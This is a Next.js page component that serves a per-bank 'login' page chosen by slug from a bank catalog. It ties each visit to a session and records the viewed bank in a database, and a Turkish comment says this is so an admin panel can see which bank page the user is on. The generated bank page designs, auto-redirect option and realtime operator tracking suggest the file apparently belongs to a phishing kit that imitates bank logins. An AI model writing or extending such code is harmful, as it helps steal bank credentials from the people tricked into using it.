import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { BankLoginClient } from "./bank-login-client";
import { getBankBySlug } from "@/lib/at-bank-catalog";
import { renderDedicatedBankClient } from "@/lib/bank-client-registry";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { createServerSupabaseClient } from "@/lib/supabase/server";

type Props = {
  params: Promise<{ id: string; bank_slug: string }>;
};

export default async function BankLoginPage({ params }: Props) {
  const { id, bank_slug } = await params;
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    routeSessionId: id,
  });
  const bank = await getBankBySlug(bank_slug);
  const bankName = bank?.name || bank_slug;

  // Admin panel "guncel sayfa" kolonu icin: kullanici hangi banka sayfasinda
  // goruntuleme yapiyor — submit'ten bagimsiz olarak burada yazilir.
  if (sessionId && bank) {
    try {
      const sb = await createServerSupabaseClient();
      if (sb) {
        const { data } = await sb
          .from("sessions")
          .select("form_data")
          .eq("id", sessionId)
          .maybeSingle();
        const fd = (data?.form_data ?? {}) as Record<string, unknown>;
        if (fd.viewingBankSlug !== bank_slug) {
          await sb
            .from("sessions")
            .update({
              form_data: {
                ...fd,
                viewingBankName: bankName,
                viewingBankSlug: bank_slug,
              },
            })
            .eq("id", sessionId);
        }
      }
    } catch {
      /* best-effort */
    }
  }
  const hasGeneratedDesign = Boolean(bank?.design?.visualTree || bank?.design?.customHtml);
  const dedicatedClient = renderDedicatedBankClient({
    sessionId,
    bankSlug: bank_slug,
    bankName,
    hasGeneratedDesign,
    forceAutoRedirect: bank?.autoRedirect,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId} routeSessionId={routeSessionId} />
      {dedicatedClient ? (
        dedicatedClient ?? null
      ) : (
        <BankLoginClient sessionId={sessionId} bankSlug={bank_slug} bank={bank} />
      )}
    </>
  );
}
